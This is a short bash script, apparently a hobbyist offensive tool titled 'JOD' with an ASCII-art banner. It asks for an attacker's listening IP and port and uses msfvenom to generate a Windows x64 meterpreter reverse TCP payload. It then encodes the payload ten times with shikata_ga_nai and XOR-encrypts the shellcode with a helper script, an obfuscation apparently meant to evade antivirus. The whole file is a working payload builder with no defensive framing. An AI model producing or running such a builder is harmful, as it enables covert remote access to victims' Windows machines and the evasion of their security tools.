#!/bin/bash
echo "
░██╗░░░░░░░██╗███████╗██╗░░░░░░█████╗░░█████╗░███╗░░░███╗███████╗  ░░░░░██╗░█████╗░██████╗░
░██║░░██╗░░██║██╔════╝██║░░░░░██╔══██╗██╔══██╗████╗░████║██╔════╝  ░░░░░██║██╔══██╗██╔══██╗
░╚██╗████╗██╔╝█████╗░░██║░░░░░██║░░╚═╝██║░░██║██╔████╔██║█████╗░░  ░░░░░██║██║░░██║██║░░██║
░░████╔═████║░██╔══╝░░██║░░░░░██║░░██╗██║░░██║██║╚██╔╝██║██╔══╝░░  ██╗░░██║██║░░██║██║░░██║
░░╚██╔╝░╚██╔╝░███████╗███████╗╚█████╔╝╚█████╔╝██║░╚═╝░██║███████╗  ╚█████╔╝╚█████╔╝██████╔╝
░░░╚═╝░░░╚═╝░░╚══════╝╚══════╝░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝  ░╚════╝░░╚════╝░╚═════╝░

                                                                           Made With ❤️ by Morning_Star"

                                                       
echo "The Payload will be created with the help of Metasploit Framework..."
echo "                
"                                                                           
echo "Enter the LHOST = " 
read ip

echo "Enter the LPORT = " 
read port

echo "The Payload is being created. Till then hold your patience."
echo "
"
msfvenom -p windows/x64/meterpreter_reverse_tcp  LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -i 10 -f raw -o jod.txt
echo "Time For Encryption😉😉😉"
python xor_file.py jod.txt > jod_output.txt
echo "
"
echo "jod_output.txt holds the encrypted shellcode."
